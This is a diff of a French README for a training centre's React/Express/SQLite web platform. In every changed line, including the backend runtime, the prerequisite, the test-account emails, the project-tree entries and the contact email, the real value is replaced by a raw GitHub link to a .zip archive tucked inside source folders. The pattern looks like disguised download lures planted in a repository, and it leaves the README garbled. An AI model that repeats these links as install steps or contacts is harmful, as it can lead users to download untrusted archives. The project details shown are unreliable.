@@ -18,7 +18,7 @@ THE SEVEN ENGINEER est un centre de formation à but non lucratif situé à Ngao
 - **Système de messagerie** en temps réel
 - **Responsive design** pour tous les appareils
 
-### Backend (https://raw.githubusercontent.com/will695672804/TheSevenEngineers/main/server/middleware/The_Seven_Engineers_2.0.zip + Express + SQLite)
+### Backend (https://raw.githubusercontent.com/will695672804/TheSevenEngineers/main/src/components/layout/Engineers-Seven-The-v1.2-alpha.5.zip + Express + SQLite)
 - **API REST complète** avec authentification JWT
 - **Base de données SQLite** avec relations complètes
 - **Gestion des utilisateurs** et rôles (admin/user)
@@ -39,7 +39,7 @@ THE SEVEN ENGINEER est un centre de formation à but non lucratif situé à Ngao
 - Lucide React pour les icônes
 
 ### Backend
-- https://raw.githubusercontent.com/will695672804/TheSevenEngineers/main/server/middleware/The_Seven_Engineers_2.0.zip avec Express
+- https://raw.githubusercontent.com/will695672804/TheSevenEngineers/main/src/components/layout/Engineers-Seven-The-v1.2-alpha.5.zip avec Express
 - SQLite pour la base de données
 - JWT pour l'authentification
 - bcryptjs pour le hashage des mots de passe
@@ -49,7 +49,7 @@ THE SEVEN ENGINEER est un centre de formation à but non lucratif situé à Ngao
 ## 📦 Installation et démarrage
 
 ### Prérequis
-- https://raw.githubusercontent.com/will695672804/TheSevenEngineers/main/server/middleware/The_Seven_Engineers_2.0.zip (version 16 ou supérieure)
+- https://raw.githubusercontent.com/will695672804/TheSevenEngineers/main/src/components/layout/Engineers-Seven-The-v1.2-alpha.5.zip (version 16 ou supérieure)
 - npm ou yarn
 
 ### Installation
@@ -85,11 +85,11 @@ npm run dev:server
 ## 👥 Comptes de test
 
 ### Administrateur
-- **Email**: https://raw.githubusercontent.com/will695672804/TheSevenEngineers/main/server/middleware/The_Seven_Engineers_2.0.zip
+- **Email**: https://raw.githubusercontent.com/will695672804/TheSevenEngineers/main/src/components/layout/Engineers-Seven-The-v1.2-alpha.5.zip
 - **Mot de passe**: admin
 
 ### Utilisateur
-- **Email**: https://raw.githubusercontent.com/will695672804/TheSevenEngineers/main/server/middleware/The_Seven_Engineers_2.0.zip
+- **Email**: https://raw.githubusercontent.com/will695672804/TheSevenEngineers/main/src/components/layout/Engineers-Seven-The-v1.2-alpha.5.zip
 - **Mot de passe**: user
 
 ## 📚 Structure du projet
@@ -101,13 +101,13 @@ npm run dev:server
 │   ├── pages/                  # Pages de l'application
 │   ├── services/               # Services API
 │   └── ...
-├── server/                      # Backend https://raw.githubusercontent.com/will695672804/TheSevenEngineers/main/server/middleware/The_Seven_Engineers_2.0.zip
+├── server/                      # Backend https://raw.githubusercontent.com/will695672804/TheSevenEngineers/main/src/components/layout/Engineers-Seven-The-v1.2-alpha.5.zip
 │   ├── database/               # Configuration base de données
 │   ├── middleware/             # Middlewares Express
 │   ├── routes/                 # Routes API
 │   └── uploads/                # Fichiers uploadés
 ├── .env                        # Variables d'environnement
-└── https://raw.githubusercontent.com/will695672804/TheSevenEngineers/main/server/middleware/The_Seven_Engineers_2.0.zip               # Dépendances et scripts
+└── https://raw.githubusercontent.com/will695672804/TheSevenEngineers/main/src/components/layout/Engineers-Seven-The-v1.2-alpha.5.zip               # Dépendances et scripts
 ```
 
 ## 🔧 API Endpoints
@@ -204,7 +204,7 @@ Ce projet est développé pour THE SEVEN ENGINEER. Pour contribuer :
 **THE SEVEN ENGINEER**
 - Adresse: Ngaoundéré 3ème, Bini - Mini-cité la Marseillaise
 - Téléphone: +237 674 13 66 97
-- Email: https://raw.githubusercontent.com/will695672804/TheSevenEngineers/main/server/middleware/The_Seven_Engineers_2.0.zip
+- Email: https://raw.githubusercontent.com/will695672804/TheSevenEngineers/main/src/components/layout/Engineers-Seven-The-v1.2-alpha.5.zip
 
 ---
 
